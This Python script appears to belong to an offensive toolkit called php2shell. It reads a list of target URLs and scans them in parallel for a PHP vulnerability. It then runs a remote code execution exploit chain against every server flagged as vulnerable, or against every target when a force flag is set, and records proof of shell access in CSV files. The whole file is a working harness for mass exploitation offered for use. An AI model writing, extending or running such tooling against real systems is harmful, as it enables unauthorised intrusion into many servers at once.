#!/usr/bin/env python3
"""php2shell bulk runner — scan many targets, then exploit the vulnerable ones.

Ties the two tools in this repo together into one copy-paste workflow:

    1. SCAN    — run the php2shell detector (scanner.py) over every URL, in
                 parallel, and write the verdict for each to a CSV.
    2. EXPLOIT — for each target the scanner flagged VULNERABLE, run the full
                 RCE chain (exploit.py --auto) and record the result.

Input file can be:

    * CSV with a header row   (recommended — lets you set per-target options)
    * plain list, one URL/line
    * JSON array of URLs

Usage:
    python3 bulk.py targets.csv
    python3 bulk.py targets.csv --scan-only          # detection only
    python3 bulk.py targets.csv --exploit-only       # skip re-scanning
    python3 bulk.py targets.csv --force --threads 20 # exploit every target

CSV columns (only ``url`` is required):

    url            target URL (http/https, path included)
    cmd            shell command to run on RCE (default: id)
    fetch          webroot file the command writes, read back as proof
                   (default: /pwn.txt)
    sleep_oracle   true/1 → blind timing oracle instead of --fetch
    zif_offset     build offset (hex) — supply BOTH zif_offset + dtor_offset to
                   skip --auto and its offsets.json lookup
    dtor_offset    build offset (hex)
    arch           amd64|arm64 for the offsets DB (default amd64)
    session_name   PHP session.name (default PHPSESSID)
    huge_mb        OOM field size in MiB (default: auto-ladder)
    r0_lo / r0_hi  r0 sweep bounds (hex)
    sapi           auto|mod_php|fpm — scanner verdict rules (default auto)
    insecure       true/1 → skip TLS verification (scanner + exploit)
    label          free-text carried into the output rows (for your notes)
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import scanner  # reuse the detector + its list/JSON loaders  # noqa: E402

EXPLOIT = os.path.join(HERE, "exploit.py")

# Default per-target options (overridden by CSV columns).
DEFAULTS = {
    "cmd": "id",
    "fetch": "/pwn.txt",
    "arch": "amd64",
    "sapi": "auto",
}


def parse_bool(value) -> bool:
    if value is None:
        return False
    return str(value).strip().lower() in ("1", "true", "yes", "y", "on")


def load_targets(path: str) -> list[dict]:
    """Read the input file into a list of per-target dicts (see module docstring)."""
    with open(path, "r", encoding="utf-8-sig") as fh:
        raw = fh.read()

    stripped = raw.lstrip()
    if stripped.startswith("["):
        try:
            data = json.loads(raw)
        except ValueError as exc:
            sys.exit(f"[ERROR] invalid JSON in {path}: {exc}")
        rows = []
        for item in data:
            if isinstance(item, str):
                rows.append({"url": item})
            elif isinstance(item, dict):
                rows.append(item)
        return _normalize_rows(rows)

    # CSV if the first data line contains a comma.
    lines = raw.splitlines()
    data_lines = [ln for ln in lines if ln.strip() and not ln.lstrip().startswith("#")]
    if data_lines and "," in data_lines[0]:
        try:
            rows = list(csv.DictReader(lines))
        except csv.Error as exc:
            sys.exit(f"[ERROR] failed to parse CSV in {path}: {exc}")
        return _normalize_rows(rows)

    # Plain list → each row is just a URL.
    return _normalize_rows(
        [{"url": ln} for ln in scanner.load_hosts(path)]
    )


def _normalize_rows(rows: list[dict]) -> list[dict]:
    out = []
    for row in rows:
        url = (row.get("url") or row.get("host") or "").strip()
        if not url:
            continue
        out.append(row)
    return out


def scan_one(row: dict, timeout: int, verify_ssl: bool, headers: dict) -> dict:
    result = scanner.check_vulnerability(
        row["url"],
        timeout=timeout,
        verify_ssl=verify_ssl,
        custom_headers=headers,
        sapi=row.get("sapi") or DEFAULTS["sapi"],
    )
    return result


def _first_line_matching(output: str, prefix: str) -> str:
    for line in output.splitlines():
        if prefix in line:
            return line.strip()
    return ""


def exploit_one(row: dict, timeout: float, verify_ssl: bool) -> dict:
    url = row["url"]
    args = [sys.executable, EXPLOIT, "--url", url,
            "--cmd", row.get("cmd") or DEFAULTS["cmd"]]
    sleep_oracle = parse_bool(row.get("sleep_oracle"))
    if sleep_oracle:
        args.append("--sleep-oracle")
    else:
        args += ["--fetch", row.get("fetch") or DEFAULTS["fetch"]]

    zif = row.get("zif_offset")
    dtor = row.get("dtor_offset")
    if zif and dtor:
        args += ["--zif-offset", str(zif), "--dtor-offset", str(dtor)]
    else:
        args += ["--auto", "--arch", row.get("arch") or DEFAULTS["arch"]]

    if row.get("session_name"):
        args += ["--session-name", str(row["session_name"])]
    if row.get("huge_mb"):
        args += ["--huge-mb", str(row["huge_mb"])]
    if row.get("r0_lo"):
        args += ["--r0-lo", str(row["r0_lo"])]
    if row.get("r0_hi"):
        args += ["--r0-hi", str(row["r0_hi"])]
    if not verify_ssl or parse_bool(row.get("insecure")):
        args.append("--no-verify")
    args += ["--timeout", str(timeout)]

    started = time.time()
    try:
        proc = subprocess.run(args, capture_output=True, text=True, timeout=timeout * 30)
        code = proc.returncode
        stdout, stderr = proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return {"url": url, "exploited": False, "result": "TIMEOUT",
                "seconds": round(time.time() - started, 1),
                "reuse": "", "proof": "", "output": ""}

    result = "RCE" if code == 0 else "FAILED"
    return {
        "url": url,
        "exploited": code == 0,
        "result": result,
        "seconds": round(time.time() - started, 1),
        "reuse": _first_line_matching(stdout, "reuse:"),
        "proof": _first_line_matching(stdout, "PROOF"),
        "output": (stderr or stdout).strip()[:2000],
    }


def write_scan_csv(results: list[dict], path: str) -> None:
    fieldnames = ["label", "url", "verdict", "sapi", "powered_by", "reason",
                  "status_code", "error"]
    with open(path, "w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=fieldnames, extrasaction="ignore")
        w.writeheader()
        for r in results:
            row = {
                "label": r.get("label", ""),
                "url": r.get("host") or r.get("url", ""),
                "verdict": r.get("verdict", ""),
                "sapi": r.get("sapi", ""),
                "powered_by": r.get("powered_by", ""),
                "reason": r.get("reason", ""),
                "status_code": r.get("status_code", ""),
                "error": r.get("error", ""),
            }
            w.writerow(row)


def write_exploit_csv(results: list[dict], path: str) -> None:
    fieldnames = ["label", "url", "result", "seconds", "reuse", "proof", "output"]
    with open(path, "w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=fieldnames, extrasaction="ignore")
        w.writeheader()
        for r in results:
            w.writerow(r)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell bulk: scan many targets, exploit the vulnerable ones",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    ap.add_argument("targets", help="CSV / plain-list / JSON-array file of URLs")
    ap.add_argument("--scan-only", action="store_true",
                    help="only run detection (no exploitation)")
    ap.add_argument("--exploit-only", action="store_true",
                    help="skip scanning; exploit every target in the file")
    ap.add_argument("--force", action="store_true",
                    help="exploit every target, not just the ones flagged VULNERABLE")
    ap.add_argument("-t", "--threads", type=int, default=10,
                    help="concurrent scan threads (default 10)")
    ap.add_argument("--timeout", type=int, default=60,
                    help="per-request timeout in seconds (default 60)")
    ap.add_argument("-k", "--insecure", action="store_true",
                    help="disable TLS certificate verification")
    ap.add_argument("-H", "--header", action="append", dest="headers", metavar="K: V",
                    help="extra request header, repeatable")
    ap.add_argument("--sapi", choices=("auto", "mod_php", "fpm"), default=None,
                    help="scanner verdict rules (default auto; overrides per-row)")
    ap.add_argument("--out-dir", default=".",
                    help="directory for output CSVs (default: current)")
    a = ap.parse_args()

    rows = load_targets(a.targets)
    if not rows:
        sys.exit("[ERROR] no targets found in %s" % a.targets)

    try:
        headers = scanner.parse_headers(a.headers) if a.headers else {}
    except ValueError as exc:
        sys.exit(str(exc))

    verify_ssl = not a.insecure
    os.makedirs(a.out_dir, exist_ok=True)
    scan_path = os.path.join(a.out_dir, "bulk_scan.csv")
    exploit_path = os.path.join(a.out_dir, "bulk_exploit.csv")

    scan_results: list[dict] = []
    if not a.exploit_only:
        print(f"[*] scanning {len(rows)} target(s) with {a.threads} thread(s) ...")
        with ThreadPoolExecutor(max_workers=a.threads) as pool:
            futures = {pool.submit(scan_one, row, a.timeout, verify_ssl, headers): row
                       for row in rows}
            for future in as_completed(futures):
                row = futures[future]
                try:
                    res = future.result()
                except Exception as exc:  # one bad target must not stop the sweep
                    res = scanner.base_result(row["url"])
                    res["error"] = f"unexpected error: {exc}"
                    res["reason"] = res["error"]
                res["label"] = row.get("label", "")
                scan_results.append(res)
                verdict = res["verdict"]
                flag = "VULN" if res["vulnerable"] else verdict
                print(f"  [{flag:<4}] {res['host']}")
        write_scan_csv(scan_results, scan_path)
        print(f"[+] scan results -> {scan_path}\n")
    else:
        scan_results = []

    if a.scan_only:
        return 0

    if a.exploit_only or a.force:
        exploit_rows = rows
    else:
        by_url = {r["host"]: r for r in scan_results}
        exploit_rows = [row for row in rows
                        if by_url.get(row["url"], {}).get("vulnerable") is True]

    if not exploit_rows:
        print("[*] no VULNERABLE targets to exploit (use --force to try anyway).")
        return 0

    print(f"[*] exploiting {len(exploit_rows)} target(s) ...")
    exploit_results: list[dict] = []
    # The chain is heavy (r0 sweep); run sequentially by default to keep the
    # target stable. Bump threads only if you know the targets can take it.
    with ThreadPoolExecutor(max_workers=1) as pool:
        futures = [pool.submit(exploit_one, row, a.timeout, verify_ssl)
                   for row in exploit_rows]
        for future in as_completed(futures):
            res = future.result()
            exploit_results.append(res)
            print(f"  [{'RCE' if res['exploited'] else res['result']:<4}] {res['url']}")

    # attach labels back
    for res in exploit_results:
        for row in rows:
            if row["url"] == res["url"]:
                res["label"] = row.get("label", "")
                break

    write_exploit_csv(exploit_results, exploit_path)
    print(f"[+] exploit results -> {exploit_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
